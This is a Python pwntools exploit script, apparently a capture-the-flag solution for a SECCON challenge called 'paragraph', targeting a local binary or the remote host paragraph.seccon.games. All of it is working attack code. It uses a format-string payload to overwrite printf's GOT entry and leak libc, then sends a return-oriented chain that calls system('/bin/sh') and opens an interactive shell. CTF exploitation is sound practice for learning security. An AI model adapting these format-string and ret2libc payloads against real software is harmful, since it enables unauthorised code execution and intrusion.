#!/usr/bin/env python3
from pwn import *

if len(sys.argv) == 1:
    s = process('./chall')
else:
    s = remote('paragraph.seccon.games', 5000)

elf = ELF('./chall')
libc = ELF('./libc.so.6')

payload = b'%p%25218x%8$hn'
payload = payload.ljust(0x10, b'\0') + p64(elf.got['printf'])[:-1]

s.sendafter(b'asked.\n', payload)

libc.address = int(s.recv(14), 0x10) - 0x1b28c0
log.info('libc base: %#x' % libc.address)

pop_rdi = 0x401283
nop = 0x40110e

payload = b' answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted '
payload += b'A' * 0x28
payload += p64(nop)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\0')))
payload += p64(libc.symbols['system'])
payload += b' A'
s.sendline(payload)

s.interactive()
